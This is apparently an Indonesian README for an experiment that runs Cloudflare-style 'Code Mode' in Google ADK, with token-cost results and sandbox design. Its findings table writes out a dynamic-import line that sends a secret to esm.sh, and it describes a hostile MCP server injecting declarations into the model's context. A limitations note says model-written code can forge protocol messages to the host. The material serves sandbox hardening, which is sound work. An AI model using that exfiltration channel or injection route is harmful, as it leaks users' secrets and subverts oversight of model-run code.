# Code Mode untuk Google ADK

Implementasi pola **Code Mode** ([Cloudflare](https://blog.cloudflare.com/code-mode/))
di Google ADK: MCP tool diubah jadi API TypeScript, dan model menulis kode yang
memanggil API itu di sandbox — bukan memanggil tool satu per satu.

Dibangun sebagai **eksperimen yang diukur**, bukan sebagai library siap pakai.
Pertanyaannya: apakah klaim blog itu bertahan di ADK?

## Jawaban singkat: bertahan secara kondisional

Klaim blog ada tiga. Hasil pengukuran:

| Klaim blog | Hasil |
|---|---|
| "handle **many more tools**" | ✅ didukung — biaya deklarasi code mode **konstan**, direct naik linear |
| "handle **more complex tools**" | ✅ didukung, efek terkuat — `oneOf` + enum besar jauh lebih padat sebagai union TS |
| "shines when **stringing together multiple calls**" | ⚠️ **hanya kalau kodenya jadi sekali** |

Temuan yang blog tidak sebut sama sekali, dan ternyata paling menentukan:

```
kode jadi sekali (turn=2)   : 0,85x token  -> code mode 15% lebih murah
perlu diperbaiki (turn>2)   : 2,06x token  -> code mode 2x lebih mahal
tingkat jadi-sekali          : 8/16 (50%)  pada gemini-3.5-flash
```

Jadi penentunya **bukan jumlah tool**, tapi **apakah kode generasi model jalan
di percobaan pertama**. Saat gagal, setiap perbaikan mengirim ulang seluruh blok
deklarasi + kode yang gagal + error — biayanya naik jauh lebih cepat daripada
direct mode yang cukup mengulang satu tool call.

Detail lengkap: [`docs/eval-results.md`](docs/eval-results.md).

## Status

| Fase | Status |
|---|---|
| 0 — Spike (6 pertanyaan kelayakan) | ✅ selesai |
| 1 — Catalog + Codegen TS | ✅ gerbang lolos |
| 2 — Sandbox + RPC | ✅ 28 test |
| 3 — Integrasi ADK | ✅ gerbang lolos |
| 4 — Evaluasi | ⚠️ sebagian: biaya konteks lengkap, correctness lengkap, grid token baru 10/30 |
| 5 — Pengerasan | ⬜ belum |

84 unit test, `ruff` bersih, `deno check` + `deno lint` bersih.

## Arsitektur

In-process, meniru `codemode()` Cloudflare — supervisor = agent = pemegang
token, sesuai blog: *"All calls made on it go to the agent supervisor first,
which holds the access tokens."*

```
┌─ agent.py (ADK) ───────────────────────────────┐
│  LlmAgent(                                     │
│    instruction=cm.instruction_provider(...),   │
│    tools=[cm.tool])          <- SATU tool      │
└────────────────────────────────────────────────┘
        CodeMode
        ├── Catalog     : BaseTool[] -> katalog netral
        ├── Codegen     : katalog -> deklarasi API   [pluggable: TS | PY]
        ├── ExecuteCodeTool
        ├── Sandbox     : Deno, fresh per call, tanpa jaringan
        ├── RpcBridge   : satu-satunya lapisan yang menyentuh ADK
        └── OutputGuard : bounding log -> artifact
```

Egress sandbox hanya stdio ke proses induk. Tanpa jaringan sama sekali, jadi
tidak ada port atau kredensial yang bisa disalahgunakan — semangat yang sama
dengan *bindings* Cloudflare (kapabilitas, bukan jaringan).

## Tujuh temuan yang tidak ada di blog

Semuanya ketemu karena ditulis test yang **bisa gagal**.

| # | Temuan |
|---|---|
| 1 | **`--deny-net` tidak memblokir module import.** Deno punya allow-list bawaan (`esm.sh`, `cdn.jsdelivr.net`, `raw.githubusercontent.com`, …). `import("https://esm.sh/x?d="+rahasia)` = kanal eksfiltrasi. `--deny-import` tidak memperbaiki, `--cached-only` **lebih buruk**. Yang benar: `--no-remote --no-npm` |
| 2 | **`isError` MCP tidak melempar exception.** Baca berkas tidak ada → hasil normal berisi `isError:true`. Di direct mode tidak berbahaya; di code mode fatal, karena kode membaca return value dan lanjut seolah berhasil |
| 3 | **Tipe `Output` tidak cocok nilai runtime.** `outputSchema` menjelaskan `structuredContent`, tapi ADK meneruskan envelope `CallToolResult` utuh. Tipe yang menyesatkan lebih buruk daripada tanpa tipe |
| 4 | **`*/` di deskripsi tool kabur dari blok JSDoc.** Server filesystem **resmi** memicunya (`'**/*.ext'`). Server bermusuhan bisa menyuntik deklarasi TS ke konteks model |
| 5 | **Callback ADK tidak jalan** kalau `tool.run_async()` dipanggil langsung — dipicu oleh flow, bukan oleh tool. Tanpa replikasi 5 langkah, HITL, deny-rule, dan hook redaksi mati tanpa suara |
| 6 | **58% deklarasi awalnya boilerplate** (envelope diulang per tool). Diperbaiki lewat komposisi `allOf` → `extends`: −42% |
| 7 | **`workerd` lokal bukan hardened sandbox** — menurut dokumen Cloudflare sendiri. Isolasi kuat Code Mode adalah properti infra mereka, bukan properti workerd yang di-self-host |

## Menjalankan

Prasyarat: Python 3.12, Node 22 (`npx`), Deno (`npm i -g deno`).

```bash
pip install -e ".[dev]"

# unit test
PYTHONPATH=src pytest tests/ -q

# gerbang Fase 1 - codegen tervalidasi type-checker
python scripts/f1_gate.py

# gerbang Fase 3 - tumpukan penuh, MCP server filesystem sungguhan
python scripts/f3_gate.py
```

Gerbang Fase 1 memakai tiga pemeriksaan, bukan satu: deklarasi harus lolos
`deno check`, probe **positif** harus lolos, dan probe **negatif** harus
**gagal**. Yang terakhir yang membuatnya berarti — tanpa itu, deklarasi yang
isinya `any` semua juga akan "lolos".

### Evaluasi

Biaya konteks (deterministik, tanpa LLM):

```bash
PYTHONPATH=. python eval/diag_declared_tools.py
```

Correctness & token (butuh endpoint OpenAI-compatible):

```bash
cp .env.example .env      # isi LITELLM_BASE_URL + LITELLM_API_KEY
PYTHONPATH=. python eval/harness.py run --tools 10,30,60
PYTHONPATH=. python eval/harness.py report
```

Hasil ditulis ke JSONL **per-run** dengan `--resume`, jadi run bisa dipotong
sesuai batas waktu dan dilanjutkan.

Kalau endpoint memakai **prompt caching**, `prompt_tokens` mengukur biaya
tagihan, bukan ukuran konteks, dan nilainya bergantung urutan eksekusi.
`eval/token_proxy.py` mengukur dari kabel dan menghitung token sendiri dengan
tokenizer yang konsisten:

```bash
python eval/token_proxy.py --port 20129 --upstream http://host-anda/v1
# lalu arahkan LITELLM_BASE_URL ke http://localhost:20129/v1
```

## Penyimpangan sadar dari blog

| Blog | Di sini | Alasan |
|---|---|---|
| Isolate V8 (Worker Loader) | Deno + container | `workerd` lokal bukan hardened sandbox |
| Bindings (`env` objek hidup) | stdio ke parent | Semangat sama, lebih kuat: tanpa stack jaringan |
| `declare const codemode` flat | `tools.<server>.<tool>` | Tabrakan nama >1 server. Satu server → tetap flat |
| Tool generik | MCP-only | Penyempitan scope. `Catalog` tetap berbasis `BaseTool` |

Blog **diam** soal enam hal yang ditambahkan di sini: timeout & batas call,
bounding output, pemetaan error, daftar tool yang ditolak, harness evaluasi,
dan jalur `direct` (ditunda).

## Batasan yang harus diketahui

- **L1 mencegah kecelakaan, bukan penyerang.** Permission berbasis flag bukan
  batas keamanan. Batas nyata = container atau VM (Fase 5).
- **Kode model bisa memalsukan pesan protokol** lewat `Deno.stdout` mentah
  (`console.log` dibajak, `writeSync` tidak). Sudah dianalisis: `call` palsu
  tetap dihitung host dan tetap lewat `RpcBridge`, jadi bukan eskalasi hak.
  Konsekuensinya **semua batas ditegakkan di host**, bukan di sandbox.
- **Tidak ada tool call paralel di lengan Python** (belum dibuat) — hanya
  relevan kalau `Codegen` Python dipakai.
- `elicitation` / `sampling` / `roots` **tidak didukung**.
- Grid token Bagian B baru 10 dan 30 tool; **60 tool belum terukur**.
- `Catalog` masih memakai satu API privat ADK (`_mcp_tool.outputSchema`).
  Input schema sudah lewat jalur publik, dan kalau yang privat hilang,
  degradasinya mulus ke index signature.

## Dokumen

| Berkas | Isi |
|---|---|
| [`implementasi.md`](implementasi.md) | Rencana, alur, fase, risiko, audit kesesuaian terhadap blog |
| [`docs/tech-stack.md`](docs/tech-stack.md) | Keputusan stack + semua kandidat yang ditolak beserta alasannya |
| [`docs/spike-results.md`](docs/spike-results.md) | Hasil Fase 0, 6 spike kelayakan |
| [`docs/eval-results.md`](docs/eval-results.md) | Hasil evaluasi, termasuk kesalahan pengukuran yang sempat terjadi |

## Lisensi

Belum ditentukan.
